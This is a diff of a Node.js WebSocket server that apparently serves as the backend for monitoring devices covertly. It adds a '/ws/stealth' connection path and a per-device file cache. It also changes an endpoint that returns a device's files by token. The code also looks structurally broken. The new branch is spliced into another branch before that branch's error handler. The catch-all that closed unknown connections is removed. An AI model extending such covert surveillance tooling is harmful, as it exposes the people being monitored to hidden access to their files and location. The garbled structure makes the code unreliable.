@@ -80,6 +80,11 @@ wss.on("connection", (ws, req) => {
       webClients.delete(ws);
       console.log(`Web client disconnected. Total: ${webClients.size}`);
     });
+    
+  } else if (deviceId && pathname.startsWith("/ws/stealth")) {
+    ws.deviceId = deviceId;
+    stealthConnections.set(deviceId, { ws, lastSeen: Date.now() });
+    console.log(`📱 Device ${deviceId} connected`);
 
     ws.on("error", (err) => {
       console.error("Web client error:", err);
@@ -148,15 +153,13 @@ wss.on("connection", (ws, req) => {
 
     ws.on("close", () => {
       stealthConnections.delete(deviceId);
+      deviceFileCache.delete(deviceId);
       console.log(`Device ${deviceId} disconnected`);
     });
 
     ws.on("error", (err) => {
       console.error(`Device error (${deviceId}):`, err);
     });
-    
-  } else {
-    ws.close();
   }
 });
 
@@ -176,8 +179,8 @@ app.get('/api/device/:deviceId/files/:token', (req, res) => {
   }
   
   const cached = deviceFileCache.get(deviceId);
-  if (cached && (Date.now() - cached.timestamp < 60000)) {
-    // ИСПРАВЛЕНО: возвращаем cached.data вместо cached.files
+  // ИЗМЕНЕНО: 60000 → 10000 (10 секунд вместо минуты)
+  if (cached && (Date.now() - cached.timestamp < 10000)) {
     return res.json(cached.data);
   }
   
@@ -517,6 +520,7 @@ function getDistance(lat1, lon1, lat2, lon2) {
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
 
 
